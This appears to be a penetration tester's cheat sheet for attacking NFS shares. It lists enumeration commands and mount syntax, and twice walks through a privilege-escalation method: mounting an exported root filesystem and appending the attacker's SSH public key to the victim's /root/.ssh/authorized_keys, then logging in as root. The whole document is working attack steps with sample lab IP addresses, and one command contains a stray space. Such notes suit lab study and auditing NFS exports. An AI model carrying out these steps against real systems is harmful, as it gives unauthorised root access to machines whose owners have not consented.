## NFS

### login
rpcinfo -p [ipaddress]

showmount -e [ip]

### SSH login
create a key

ssh-keygen

mkdir /tmp/r00t/

mount -t nfs 192.168.99.131:/ /tmp/r00t/

cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys

umount /tmp/r00t

ssh root@192.168.99.131

### to find the public share

locate *nfs*.nse

nmap --script nfs-showmount.nse <targetip>

### mount the share to a folder under /tmp

mkdir /tmp/nfs

/sbin/mount.nfs <targetip>:/home/box /tmp/nfs

showmount -e ip

mount ip:/ /tmp/NFS

mount -t ip:/ /tmp/NFS

nfs-ls #List NFS exports and check permissions

nfs-showmount #Like showmount -e

nfs-statfs #Disk statistics and info from NFS share

scanner/nfs/nfsmount #Scan NFS mounts and list permissions

showmount -e IP

mount -t nfs [-o vers=2] ip:remote_folder local_folder -o nolock


mkdir /mnt/new_back
mount -t nfs [-o vers=2] 10.12.0.150:/backup /mnt/new_back -o nolock

Config files:

/etc/exports

/etc/lib/nfs/etab

### Priv esc via nfs and SSH

Privilege Escalation via Port 2049: NFS

In this method, we will be creating an ssh key without a passphrase and exchanging it with the ssh key of the victim machine for the root user.

First, we use ssh-keygen to generate an RSA keypair without a key phrase, then we place it in the “/root/.ssh” folder where the key is found by default.  Once the key is created and placed, we will create a directory “/tmp/sshkey/” in our local machine.

The next part is a little tricky, we will be mounting the directory we just made on the victim machine using the Network File Sharing Function. Once mounted we write the key from our machine to the victim’s machine, a sort of an override, using the cat command. The thing to keep in mind here is that the key we have is without a passphrase so the after the override the key in the victim machine is also without a passphrase, so when it is connected using ssh, it’s using a blank password.

The key is now copied so we unmount the directory and connect as the root user using ssh.

showmount -e 192.168.1.103

ssh-keygen

mkdir /tmp/sshkey

mount -t nfs IP:/ /tmp/sshkey/

cat ~/ .ssh/id_rsa.pub >>/tmp/sshkey/root/.ssh/authorized_keys

umount /tmp/sshkey

ssh root@IP

showmount -e IP

ssh-keygen

mkdir /tmp/sshkey

mount -t nfs IP:/ /tmp/sshkey/

cat ~/ .ssh/id_rsa.pub >>/tmp/sshkey/root/.ssh/authorized_keys

umount /tmp/sshkey

ssh root@IP
